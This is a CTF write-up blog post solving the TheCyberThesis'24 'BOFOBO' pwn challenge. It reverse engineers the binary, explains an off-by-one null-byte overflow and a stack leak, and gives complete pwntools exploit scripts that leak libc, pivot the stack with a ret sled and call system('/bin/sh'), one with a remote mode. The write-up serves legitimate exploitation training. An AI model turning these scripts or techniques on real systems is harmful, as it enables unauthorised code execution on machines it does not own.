---
type: Blog
title: TheCyberThesis'24 - Pwn - BOFOBO
date: '2024-09-22'
tags: ['ctf', 'pwn', 'thecyberthesis', 'writeup', 'pwntools', 'off-by-one', 'buffer-overflow']
draft: false
summary: Exploiting The Buffer Overflow Vulnerability By Only One Byte!
---

## Challenge Description
Is one byte enough??

Author: Strangek

## Solution
![image.png](/static/writeups/bofobo/1.png)

These are the challenge files provided to us. When tackling pwn challenges, I typically employ a specific workflow. First, I use a custom script to extract the libc library from a Docker container. Following this, I utilize the pwninit tool to patch the current file.

The pwninit tool, can be found at [pwninit](https://www.github.com/io12/pwninit).

```bash
### Author Strangek ###
### Run this script in a folder which contain docker file ###
#!/bin/bash

DOCKER_IMAGE_NAME="my_pwn_challenge"
DOCKER_CONTAINER_NAME="pwn_challenge_container"
LIBC_FILE="libc.so.6"
DOCKERFILE_PATH="Dockerfile"

docker build -t $DOCKER_IMAGE_NAME -f $DOCKERFILE_PATH .

if [ "$(docker ps -a -q -f name=$DOCKER_CONTAINER_NAME)" ]; then
    docker rm -f $DOCKER_CONTAINER_NAME
fi

docker run -d --name $DOCKER_CONTAINER_NAME $DOCKER_IMAGE_NAME

LIBC_PATH=$(docker exec $DOCKER_CONTAINER_NAME ldd /bin/bash | grep $LIBC_FILE | awk '{print $3}')

if [ -z "$LIBC_PATH" ]; then
    echo "libc not found!"
    docker stop $DOCKER_CONTAINER_NAME
    docker rm $DOCKER_CONTAINER_NAME
    docker rmi $DOCKER_IMAGE_NAME
    exit 1
fi

docker cp $DOCKER_CONTAINER_NAME:$LIBC_PATH .

docker stop $DOCKER_CONTAINER_NAME
docker rm $DOCKER_CONTAINER_NAME

docker rmi $DOCKER_IMAGE_NAME

echo "libc downloaded successfully: $(basename $LIBC_PATH)"
```

![image.png](/static/writeups/bofobo/2.png)

We can see that the binary doesn't contain a canary, which means we won't have any issues when overflowing the buffer. Additionally, the binary is not stripped, allowing us to easily read and disassemble functions.

Let's reverse engineer the binary and examine its inner workings using Ghidra. Feel free to use any disassembler of your choice for this task.

```c
int main(void){
  setbuf(stdout,(char *)0x0);
  puts("Welcome to the Fortune Teller");
  wait_for_action();
  return 0;
}
```

Upon examining the main function, we find it doesn't contain much significant code. Let's proceed to disassemble the wait_for_action() function for more insights.

```c
	void wait_for_action(void) {
  puts("Press enter to receive your fortune");
  getc(stdin); //The getc() function is used to obtain input character 
               //by character from a stream. It's particularly useful 
               //when you need to process a stream of input data 
               //character-wise, such as parsing text or reading 
               //individual characters from a file
  reveal_fortune();
  start_fortune_telling();
  return;
}
```

There's not much significant code here either. Let's proceed to disassemble the reveal_fortune() function.

```c
void reveal_fortune(void){
  int rand;
  ulong uVar1;
  time_t time;
  char fortune_number [5];
  char address [112];
  
  printf("Choose a number between 1 and %d to reveal your fortune: ",5);
  fgets(fortune_number,5,stdin);
  uVar1 = strtol(fortune_number,(char **)0x0,10);
  time = time((time_t *)0x0);
  srand((uint)time);
  rand = rand();
  putchar(10);
  printf("Here is your fortune: %s\n",*(undefined8 *)(fortunes + (long)(rand % 5) * 8));
  snprintf(address,100,"But what the heck is this?!?!!? : %%%d$llx\n",uVar1 & 0xffffffff);
  printf(address);
  putchar(10);
  return;
}
```

We can see that we're getting a leak here of any number we enter, and there's no filtering. This allows us to leak any number, but it's not a format string bug. For a format string vulnerability to exist, we should be able to get a leak by entering %p.%p, which isn't the case here.

Great! We can exploit this to get libc and ELF leaks, which we can use to our advantage. However, we haven't found the overflow vulnerability yet. Let's dig deeper. And explore start_fortune_telling() function

```c

void start_fortune_telling(void){
  int rand;
  time_t time;
  
  puts("Share your secrets here");
  prompt_byte_count();
  puts("Take care bye!!");
  time = ::time((time_t *)0x0);
  srand((uint)time);
  rand = ::rand();
  printf("A random fortune for you: %s\n",*(undefined8 *)(fortunes + (long)(rand % 5) * 8));
  return;
}
```

There's nothing significant here. Let's move on to the prompt_byte_count() function.

```c
void prompt_byte_count(void){
  ulong len;
  char number_holder [13];
  
  printf("Can you please tell how long is your secret? ");
  fgets(number_holder,5,stdin);
  len = strtol(number_holder,(char **)0x0,10);
  if ((uint)len < 257) {
    process_message(len & 0xffffffff);
    return;
  }
  puts("Please follow the rules!");
  return;
}
```

Interestingly, this function asks the user to enter the length of their message after the fortune is revealed. The program returns if you enter more than 256, which means we can't input more than 256 bytes in this code. Let's examine what the process_message() function is doing.

```c

void process_message(undefined4 param_1){
  undefined buffer [256];
  
  display_message(buffer,param_1);
  return;
}
```

This function initializes a buffer of 256 bytes and passes both the buffer and the parameter received  to the next function parameter. For example, if we enter 256, it will pass 256 to the next function, which is display_message(). Let's examine display_message(). 

```c

void display_message(void *param_1,int param_2){
  size_t len;
  
  len = fread(param_1,1,(long)param_2,stdin);
  *(undefined *)((long)param_1 + (long)(int)len) = 0; //vulnerabilty
  puts("You shared:");
  printf("%s",param_1);
  return;
}
```

The function reads `param_2` (the number of bytes) from `stdin` using `fread(param_1, 1, (long)param_2, stdin)`. Here is the critical vulnerability: **`param_2` is controlled by the user**, and it can be as large as 256 bytes. If the user specifies 256, `fread` will try to read 256 bytes into the `buffer` of size 256. However, after reading, the code writes a null byte (`0x00`) at `(undefined *)((long)param_1 + (long)(int)len)`—this happens one byte **after** the end of the buffer (at position `buffer[256]`), which leads to **buffer overflow**.

Now that we've discovered the `off-by-one` vulnerability, it's time to exploit it. We'll employ a concept known as stack pivoting, which involves changing the stack pointer to point to a controlled memory region. This technique allows us to bypass the limited buffer size and execute our payload. By carefully crafting our input, we can overwrite the return address and redirect the program's execution flow to our desired location. Stack pivoting is particularly useful when dealing with tight space constraints or when we need to chain multiple gadgets together for a more complex exploit.

Let's run this code in GDB and examine its inner workings dynamically.

![image.png](/static/writeups/bofobo/3.png)

After sending 255 as the number and 255 bytes of data, we observed that the program exited normally. We already know that 257 isn't allowed because the program will exit when given that input. Now, let's examine what happens when we send 256 as the number and 256 bytes of data.

![image.png](/static/writeups/bofobo/4.png)

Cool! We hit a segmentation fault, but why? As I explained before, in this binary, a buffer is initialized to 256 bytes. In the display_message function, an additional null terminator is added. This means we now have a one-byte buffer overflow vulnerability because the buffer is effectively 257 bytes long, and we're only writing one byte beyond its boundary on the stack.

Now, let's proceed with the exploitation. We need one leak one of libc because we don’t need anything else to exploit.

![image.png](/static/writeups/bofobo/5.png)

let’s calculate the offset to the base:

![image.png](/static/writeups/bofobo/6.png)

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./bofobo_patched')

p = process(binary.path)
libc = ELF('./libc.so.6')

p.sendline()
p.sendlineafter(b'reveal your fortune:', b'15')
p.recvuntil(b'?!?!!? : ')
libc.address = int(p.recvline().strip().decode(), 16) - 0x2038e0 #offset
log.info('libc.address: ' + hex(libc.address))

p.interactive()
```

now let’s write a exploit.

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./bofobo_patched')

p = process(binary.path)
libc = ELF('./libc.so.6')

p.sendline()
p.sendlineafter(b'reveal your fortune:', b'15')
p.recvuntil(b'?!?!!? : ')
libc.address = int(p.recvline().strip().decode(), 16) - 0x2038e0
log.info('libc.address: ' + hex(libc.address))
pop_rdi = next(libc.search(asm('pop rdi; ret')))
payload = ((256 - 32) // 8) * p64(pop_rdi + 1) #pop_rdi + 1 = ret
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)
payload += (256 - len(payload)) * b'B'

p.sendlineafter(b'secret?', b'256')
p.send(payload)

p.interactive()
```

Here's what we did: We filled the buffer with a ret gadget, leaving the last 32 bytes for our payload. When we send these 256 bytes to the program, the null terminator at the end (the 257th byte) overwrites the rip, redirecting the instruction pointer before our buffer and pivoting the stack. We used ret gadgets to fill the buffer because the rip offset is variable. This approach eliminates the need to calculate and bruteforce the offset to rip, preventing program crashes. However, this method caused stack alignment issues, resulting in EOF errors. To overcome this, we implemented a bruteforce technique, typically receiving the shell on the second attempt at most.

```python:payload.py
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./bofobo_patched')

while True:
    p = process(binary.path)
    libc = ELF('./libc.so.6')

    try:
        p.sendline()
        p.sendlineafter(b'reveal your fortune:', b'15')
        p.recvuntil(b'?!?!!? : ')
        libc.address = int(p.recvline().strip().decode(), 16) - 0x2038e0
        log.info('libc.address: ' + hex(libc.address))

        pop_rdi = next(libc.search(asm('pop rdi; ret')))

        payload = ((256 - 32) // 8) * p64(pop_rdi + 1) #pop_rdi + 1 = ret
        payload += p64(pop_rdi)
        payload += p64(libc.search(b"/bin/sh").__next__())
        payload += p64(libc.sym.system)
        payload += (256 - len(payload)) * b'B'

        p.sendlineafter(b'secret?', b'256')
        p.send(payload)
        p.recvline()
        p.sendline(b'echo shell')
        
        if b'shell' in p.recvline(timeout=2):
            p.interactive()
            break
    except:
        continue
```

[theflash2k](https://www.github.com/theflash2k) also solved this challenge and this is his payload:

```python

#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error'

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./bofobo_patched"
elf = context.binary = ELF(exe)
libc = elf.libc

def do_exploit():

	io = remote(sys.argv[1], int(sys.argv[2])
	) if args.REMOTE else process([exe], aslr=True)

	io.sendline(b"-15")
	io.recvuntil(b"?!?!!? : ")
	leak = hexleak(io.recvline())
	info("leak @ %#x" % leak)
	libc.address = leak - 0x2038e0
	info("libc @ %#x " % libc.address)

	io.sendlineafter(b"secret? ", b"256")

	POPRDI_RET = libc.address + 0x000000000010f75b
	RET = libc.address + 0x000000000002882f

	payload = flat(
		cyclic(72, n=8),
		POPRDI_RET,
		next(libc.search(b"/bin/sh\x00")),
		RET,
		libc.sym.system
	).ljust(256, b"\x00")
	io.sendline(payload)
	io.recvline()

	try:
		io.sendline(b"id")
		p = io.recvline(timeout=1).decode('latin-1')
		print(p)
		if not p:
			io.close()
			return False
	except KeyboardInterrupt:
		exit(0)
	except:
		io.close()
		return False

	io.interactive()

while not do_exploit():
	pass
```

let’s see what he did, he calculated the offset of rip through gdb

![image.png](/static/writeups/bofobo/7.png)

I sent 3 'a' characters after 72 cyclic characters, and we observed that the rip was overwritten after a 72-byte offset. However, this offset changed with each program execution. To address this, he implemented a brute-force approach using the 72-byte offset. The strategy was to repeatedly attempt the exploit, knowing that if the 72-byte offset aligned correctly in any of these attempts, he would successfully obtain the flag.

let’s run the exploit on the remote and get the flag:

![image.png](/static/writeups/bofobo/8.png)